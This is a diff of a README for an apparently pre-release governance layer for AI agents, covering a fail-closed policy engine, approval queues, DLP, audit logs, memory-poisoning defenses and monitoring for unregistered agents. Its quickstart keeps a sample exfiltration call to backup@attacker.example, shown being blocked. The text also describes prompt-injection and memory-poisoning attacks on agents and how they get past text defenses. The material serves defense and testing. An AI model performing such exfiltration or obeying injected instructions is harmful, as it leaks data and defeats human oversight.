@@ -1,21 +1,89 @@
-# Agent Governance — policy enforcement, human approvals, tamper-evident audit for AI agents
+# Sasanam — The AI Governance
 
-> **Not on PyPI yet** — install from a locally built wheel:
->
-> ```bash
-> cd /path/to/agent-governance-demo          # the checkout
-> python -m pip wheel . --no-deps --no-build-isolation -w dist/
-> python -m venv /tmp/gov-venv
-> /tmp/gov-venv/bin/pip install dist/agent_governance-*-py3-none-any.whl
-> ```
->
-> The base package is stdlib-only (no runtime dependencies). For the
-> LangChain adapter: `pip install "agent-governance[langchain]"`.
+**The runtime governance layer for AI agents — constrain what agents can do, watch what they actually do, and produce evidence an auditor can verify without trusting us.**
+
+*Sasanam* (శాసనం) — Sanskrit/Telugu for an edict: a rule that binds, set down in writing.
+
+## Why this exists
+
+AI agents take multi-step actions in the real world: reading files, calling APIs, sending messages, moving data. "Trust the model to behave" does not survive contact with production — 2026 has already seen agent swarms hacking their way across companies, millions of keys exfiltrated through agent tooling, and models breaching systems nobody told them to touch.
+
+Our position is simple: stop trying to make the model perfectly obedient, and instead **constrain what the actor can do, observe what it actually does, and record everything in tamper-evident form**. The enforcement core is the funnel; the metered evidence pipeline — auditor-readable exports, retention, attestation — is the product. Sell evidence, not the engine.
+
+## What it does
+
+Four jobs, one pipeline. Every agent action flows through all four.
+
+### 1. Enforce — nothing executes without a decision
+
+- **Fail-closed policy engine** (`gov/policy.py`): deny ≻ require_approval ≻ allow, default-deny. No configured key, no policy, no boundary proof — nothing runs.
+- **Human approval queue** (`gov/approvals.py`): records bind the args digest and policy hash; decisions are TTL-expired and separation-of-duty checked. **Ceremony-integrity gates** bounce empty or self-contradictory approval reasons back instead of stamping them. **Display≡execution**: the approved preview is re-derived from the exact args about to execute — any mismatch refuses fail-closed. **TOCTOU-safe**: the canonical target is re-validated at sweep time against the MAC-bound packet (v5), so a path swapped while the human was deciding can't slip through.
+- **Executor-minted identities** with role→tool least privilege, plus delegation tokens for scoped hand-offs.
+- **Signed capability manifests** (`gov/capability_manifests.py`): skills and MCP servers ship Ed25519-bound declared capabilities, verified at use time — capability drift refuses fail-closed.
+- **Countersigned invocation receipts** (`gov/invocation_receipts.py`): after a consequential execution, an Ed25519 receipt binds what actually ran — tool, args digest, canonical target, policy decision, preview digest. Independently verifiable offline.
+
+### 2. Observe — find the agents you didn't know you had
+
+- **Shadow-agent scan** (`gov/shadow_scan.py`): machine-cadence and orchestration-pattern fingerprinting over action logs. Sightings are advisory — never auto-register, never auto-block.
+- **Unknown-agent discovery/inventory** (`gov/discovery.py`): who is acting in your systems, registered or not.
+- **Rate-independent enumeration signal** (`gov/enumeration_signal.py`): structural list→read detection with zero time arithmetic — catches slow exfiltration at one query per hour just as well as one per second.
+- **Behavioral signature registry** (`gov/behavioral_sigs.py`): six versioned v1 signatures (fanned egress, parallel sessions, credential-then-export, burst cadence, memory-write-heavy, approval-queue spam), each pinned with parameters, false-positive controls, and evasion notes. Advisory-only.
+
+### 3. Remember safely — memory is an attack surface
+
+Agents that remember can be poisoned. Every memory write carries MAC-bound provenance: who wrote it, and what channel it arrived on.
+
+- **Act-gate** (`gov/memory_actgate.py`): a consequential action that reads un-elevated memory queues for human approval. Elevation requires corroboration from ≥2 independent trusted principals — one compromised writer is never enough.
+- **Review inbox + bounded journal** (`gov/memory_inbox.py`): suspicious memory is flagged or quarantined for human review, never silently trusted; per-principal quotas and chained compaction keep it bounded.
+- **Audio-carrier defense** (`gov/audio_carrier.py`): voice memos and audio attachments are magic-byte classified (WAV/MP3/OGG/FLAC). A carrier mismatch forces the write into untrusted-derived containment plus inbox review — because a paraphrased voice memo can dodge every text-channel defense while the carrier is the only remaining signal.
+
+### 4. Prove — evidence an auditor can verify without us
+
+- **Hash-chained audit log** (`gov/log.py`): HMAC-SHA256 chain, key epochs, signed checkpoints. `gov-verify` checks it offline.
+- **Offline evidence bundle** (`gov/offline_bundle.py`): a standalone stdlib-only verifier checks integrity, monotonicity, and containment — no engine required, no trust in us required.
+- **OSCAL export + evidence crosswalk** (`gov/evidence/`): mechanisms mapped to NIST AI RMF 1.0 and EU AI Act controls, verified against the primary sources (ISO/IEC 42001 rows are explicitly marked unverified — licensed text we won't claim to have checked). Deterministic OSCAL component-definition packages out of the same crosswalk.
+- **Decision replay**: past decisions re-derived deterministically from the log.
+
+### Secrets never reach the agent
+
+**Sentinel credential substitution** (`gov/sentinel_substitution.py`): agents see only `fake_value_<uuid>` placeholders. The proxy swaps real credentials in for authorized hosts only, at the last moment. This closes credential exfiltration through the agent's context — there is nothing to leak.
+
+## Architecture
+
+```
+agents ──▶ ToolExecutor ──▶ identity minted? ──▶ role allowlist? ──▶ DLP clean?
+                                                              │
+                                                     policy engine
+                                            (deny ≻ require_approval ≻ allow,
+                                             default-deny, taint + egress +
+                                             memory-provenance context)
+                                      ┌──────────┼──────────────┐
+                                      ▼          ▼              ▼
+                                    deny   require_approval   allow
+                                      │          │              │
+                                      │   ┌──────▼──────┐       │
+                                      │   │   approval  │       │
+                                      │   │    queue    │       │
+                                      │   │ ceremony    │       │
+                                      │   │ gates ·     │       │
+                                      ▼   │ display≡exec│       ▼
+                           write-ahead│   │ TOCTOU-safe │  execute
+                           audit log  │   └──────┬──────┘       │
+                           HMAC-      │    human decides        │
+                           chained    │    (gov-approve /       ▼
+                                      │     web UI)      countersigned
+                                      └────────┬─────────▶ receipt
+                                               │
+                    ┌──────────────────────────┼──────────────────────────┐
+                    ▼                          ▼                          ▼
+            offline evidence bundle    shadow scan + discovery     memory act-gate
+            OSCAL export               (advisory sightings)        + review inbox
+            decision replay
+```
 
 ## Try it in 60 seconds
 
-Wrap any tool-using function in ~5 lines; every call is mediated
-(identity → role allowlist → DLP → fail-closed policy → audit log):
+Wrap any tool-using function; every call is mediated (identity → role allowlist → DLP → fail-closed policy → write-ahead audit log):
 
 ```python
 from gov.adapters.core import GovernedBinding
@@ -33,170 +101,59 @@ send_email(to="backup@attacker.example", subject="db export",
 # -> ToolDeniedError: Blocked by DLP rule dlp-github-token ... (logged in the audit trail)
 ```
 
-Runnable copy-paste scripts live in `examples/` (each self-contained, synthetic —
-no network, no real systems):
-
-| Script | What it shows |
-|---|---|
-| `examples/quickstart_5line.py` | the 5-line wrap above, end to end: poisoned ticket → denied send → audit entry → `gov-verify` |
-| `examples/langchain_wrapped.py` | a real `langchain_core` `StructuredTool` governed; exfil invoked through LangChain is denied (`pip install "agent-governance[langchain]"`) |
-| `examples/mcp_wrapped.py` | `GovernedMCPClient`: denied calls never reach the MCP server (verified: zero session calls) |
-| `examples/openai_loop_wrapped.py` | OpenAI-style `tool_calls` loop; the denial becomes a tool message the model can react to |
+A runnable copy-paste version lives at `examples/quickstart_5line.py` (self-contained, synthetic — no network, no real systems). More adapters in `examples/`: LangChain `StructuredTool`, MCP client, OpenAI-style tool-call loop.
 
 Then inspect the run the same way you would in production:
 
 ```bash
 gov-verify <run_dir>/actions.jsonl        # offline HMAC chain check (exit 0 = OK)
 gov-approve --rundir <run_dir> list       # human approval queue
+gov-evidence-verify <bundle>              # standalone offline evidence check
 gov-report --rundir <run_dir>             # severity-ranked Markdown + HTML report
 gov-policy-lint policies/default.yaml     # lint the policy set
 ```
 
-**SYNTHETIC DEMONSTRATION.** Every tool is simulated, every byte stays on
-this machine: no network calls, no real credentials, no real systems.
-What *is* real: the enforcement pipeline. Every agent action flows
-through identity verification → role allowlist → DLP → rate/volume
-guards → a fail-closed policy engine → write-ahead audit logging, before
-anything executes.
+**SYNTHETIC DEMONSTRATION.** Every tool is simulated, every byte stays on this machine: no network calls, no real credentials, no real systems. What *is* real: the enforcement pipeline. Key behavior to know: without a configured key every entry point fails closed — there is no dev-key fallback anywhere.
 
-## Five-minute quickstart
-
-Install from a locally built wheel (not on PyPI yet), then run the
-demos in a fresh directory. The full cold-reader path — wheel only, no
-checkout — is `workstreams/architect/QUICKSTART.md`.
+Install (not on PyPI yet — build the wheel locally; the base package is stdlib-only):
 
 ```bash
 python -m pip wheel . --no-deps --no-build-isolation -w dist/
 python -m venv /tmp/gov-venv
-/tmp/gov-venv/bin/pip install dist/agent_governance-*-py3-none-any.whl
-
-mkdir /tmp/gov-try && cd /tmp/gov-try
-export GOV_LOG_KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")
-export GOV_LOG_KEY_EPOCH=test
-
-gov-demo                                  # 1. 4-agent scenario; risky steps queued, not executed
-RUN_DIR=$(ls -dt runs/*/ | head -1)
-gov-verify "$RUN_DIR/actions.jsonl"       # 2. offline chain verification (exit 0 = OK)
-gov-approve list                          # 3. inspect the human approval queue (latest run)
-gov-report --rundir "$RUN_DIR"            # 4. write reports/<run>_audit_report.md|html
-gov-attack-demo                           # 5. attack scenario: 4 blocked, 0 allowed, 1 tampering detected
+/tmp/gov-venv/bin/pip install dist/sasanam-*-py3-none-any.whl
+# LangChain adapter: pip install "sasanam[langchain]"
 ```
 
-Then lint the policy that ships inside the wheel (no checkout needed):
+## How we make sure it works
 
-```bash
-POLICY=$(/tmp/gov-venv/bin/python -c "import importlib.resources as r; print(r.files('gov') / 'data' / 'default.yaml')")
-gov-policy-lint "$POLICY"                 # 2 info findings, 0 errors, 0 warnings
-```
-
-Key behavior to know: without a configured key every entry point fails
-closed (there is no dev-key fallback anywhere). `gov-demo` is the one
-exception — it self-provisions a test key for the synthetic run, so
-export `GOV_LOG_KEY` in the same shell if you want to verify the log
-afterwards.
-
-## What it enforces (all demonstrated, all tested)
-
-| Control | Where | Test |
-|---|---|---|
-| Fail-closed policy engine (deny > require_approval > allow; default-deny) | `gov/policy.py` | `test_policy_config.py` |
-| Executor-minted identities; role→tool least privilege | `gov/executor.py` | `test_privilege_escalation.py` |
-| Credential/PII DLP blocks + redaction-before-log | `gov/dlp.py` | `test_injection_exfiltration.py` |
-| HMAC-SHA256 chained log, key epochs, signed checkpoints, offline verify | `gov/log.py` | `test_log_integrity.py`, `test_new_controls.py` |
-| Write-ahead audit: authorization logged before any side effect | `gov/executor.py` | `test_new_controls.py` |
-| Input provenance / taint tracking, read-before-send correlation | `gov/executor.py` | `test_injection_exfiltration.py`, `test_new_controls.py` |
-| Domain egress allowlist | `policies/default.yaml` | `test_injection_exfiltration.py` |
-| Integrity-bound, expiring, separation-of-duty approvals | `gov/approvals.py` | `test_approval_abuse.py` |
-| TOCTOU-safe approved execution (re-validate at execution time) | `gov/executor.py` | `test_approval_abuse.py` |
-| Per-run rate, volume, repeated-call guards | `gov/executor.py` | `test_rate_limits.py` |
-| Policy linter | `gov/policy_lint.py` | — (CLI) |
-
-## Architecture
-
-```
-agents ──▶ ToolExecutor ──▶ identity minted? ──▶ role allowlist? ──▶ DLP clean?
-              (simulated      (reject forged/       (least           (block creds,
-               tools:           foreign ids)         privilege)        redact PII)
-               read/write/
-               delete/api/
-               post/email)
-                                │ pass
-                                ▼
-                        policy engine (deny ≻ require_approval ≻ allow,
-                                       default-deny, taint + egress context)
-                          ┌─────────┴──────────┐
-                     allow/deny          require_approval
-                          │                      │ (no execution)
-                          ▼                      ▼
-              write-ahead audit log ◀── approval queue (file-based)
-              HMAC-chained JSONL     │   integrity digest · policy-hash pin
-              + signed checkpoints   │   TTL expiry · SoD · preview
-                          │          └── human: gov-approve list/approve/reject
-                          ▼                    (decisions logged)
-                    gov-verify / gov-report
-```
-
-## The demo scenario
-
-`gov-demo` runs four agents (scout → triage → builder → publisher) through
-a synthetic OSS-contribution pipeline. Along the way it exercises every
-control: a prompt-injected ticket steers the support agent toward
-exfiltration (denied by egress + DLP), a builder tries to write outside
-the sandbox (quarantined for approval), high-volume API reads trip the
-approval budget, and a human resolves the queue through the real CLI.
-The run ends with a verified audit summary; `gov-report` turns the log
-into a severity-ranked Markdown + HTML report under `reports/`.
-
-## Red-team suite
-
-`tests/` holds the harness plus six attack modules (`weaknesses-a.md`,
-`weaknesses-b.md` record all 30 weaknesses the suite was built from).
-Phase 2 baseline: 30 failing / 1 passing. After the Phase-3 build:
-**36 tests, all passing** (`python3 tests/run_tests.py`). `BUILD_LOG.md`
-records every batch, regression, and test correction.
-
-## Files
-
-- `gov/identity.py` — `AgentIdentity`; only `executor.mint_identity()` can
-  create callable identities (`UnmintedIdentityError` otherwise).
-- `gov/log.py` — HMAC-SHA256 chained JSONL, key epochs, signed
-  checkpoints, offline verification. `GOV_LOG_KEY` sets the HMAC key;
-  without it a documented dev key is used (zero integrity — the warning
-  says so).
-- `gov/dlp.py` — credential blockers + PII redaction + payload
-  summarization, applied before policy evaluation and before logging.
-- `gov/policy.py` — fail-closed engine: deny ≻ require_approval ≻ allow,
-  default-deny, rule validation, `policy_hash`.
-- `gov/policy_lint.py` — policy linter CLI.
-- `gov/approvals.py` — approval queue + `gov-approve` CLI. Records bind
-  args digest + policy hash; decisions are separation-of-duty checked,
-  TTL-expired, and logged (including rejected attempts).
-- `gov/executor.py` — the enforcement pipeline: identity, roles, DLP,
-  guards, provenance/taint, egress, write-ahead logging, approvals,
-  TOCTOU-safe execution.
-- `gov/verify.py` — offline log verifier CLI (`gov-verify`).
-- `policies/default.yaml` — the default policy set (v2, fail-closed).
-- `demo/run_demo.py`, `demo/make_report.py` — scenario + audit reports.
-- `THREAT_MODEL.md`, `REQUIREMENTS.md`, `research/` — design basis.
-- `BUILD_LOG.md` — implementation journal.
+- **Break-first.** Every finding is demonstrated red on the unmodified tree before it is fixed, and closures are proven at the public seams — never on green tests alone.
+- **Finding hygiene.** `evals/FINDINGS.md` holds 190+ filed findings, each with severity, attack shape, red-team evidence, and close-when criteria. Overstated closures are re-filed as new findings, never quietly patched.
+- **Gates before every release**: the canonical suite (thousands of checks), the registry gate, a 3,216-situation adversarial matrix, realistic attack scenarios, and an AMSB red-team scorecard. Batteries are deterministic (×2) and clean-env verified.
+- **Honest residuals.** Every lane reports what its fix does *not* cover, in writing, in the tree. If a number is synthetic, it says so.
 
 ## Honest limitations
 
-- Tools are simulated: "execution" never leaves the process. The
-  enforcement logic is real; the tool effects are not.
-- Log integrity rests on `GOV_LOG_KEY` custody. The dev fallback is
-  explicitly insecure; multi-epoch keyring verification is not built.
-- Approved actions re-run from redacted/summarized args — large
-  secret-bearing payloads don't round-trip byte-identically.
-- No real LLM quarantine: "prompt injection" here is simulated tool
-  output containing injected instructions, which is the correct layer
-  for testing the *governance* response.
-- Production hardening (Ed25519, Merkle proofs, public anchoring,
-  OPA/Cedar) is deferred — see REQUIREMENTS.md.
+- Tools are simulated in the demo harness: the enforcement logic is real, the tool effects are not. Real sandboxing for tool execution is the documented next step.
+- No audio-capable model is in the loop: carrier defenses are tested at the ingestion/governance seam with synthetic carriers, not perceptual fidelity.
+- Log integrity rests on key custody. It fails closed with no configured key; a HashiCorp Vault transit adapter exists; cloud KMS is the production answer.
+- End-to-end TLS and live transparency-log anchoring are documented v1 boundaries, not hidden gaps.
+- Precision/recall figures are synthetic self-consistency measurements, not field data.
+- The OSCAL export is a format, not a proof — no external validator has been run.
+- Discovery and behavioral signals are advisory: benign systematic activity can look identical. They are sightings, not verdicts.
 
-## Threat-model mapping
+## Layout
 
-Every control above traces to `THREAT_MODEL.md` (T1–T12) and
-`REQUIREMENTS.md` (R1–R14, P0 product bar). The 30 red-team weaknesses
-in `tests/weaknesses-a.md` / `tests/weaknesses-b.md` are each covered by
-at least one passing test.
+- `gov/` — the governance layer (policy, executor, approvals, memory, discovery, evidence, DLP, egress, adapters)
+- `gov/evidence/` — evidence crosswalk, checklist, OSCAL export
+- `gov/adapters/` — framework shims (generic decorator, LangChain, MCP, OpenAI-loop)
+- `evals/` — adversarial batteries (one per finding/control), `FINDINGS.md`, the evidence matrix battery
+- `tests/` — canonical unit suite (`tests/run_tests.py`)
+- `demo/` — the 4-agent synthetic scenario + attack scenario CLIs
+- `policies/` — default fail-closed policy set
+- `workstreams/` — research notes, prospecting, architecture (sibling dirs at repo-parent level for discovery/supply-chain/evidence streams)
+- `examples/` — runnable copy-paste integrations
+- `BUILD_LOG.md` — the implementation journal, every wave
+
+## Status
+
+Private repository, pre-release. Building toward v1 (target 2026-10-31) — the quality bar governs the date, not the other way around. Nothing here is a certification, and no export claims otherwise: the evidence is decision *support*, built so a skeptical auditor can check our work without trusting us.
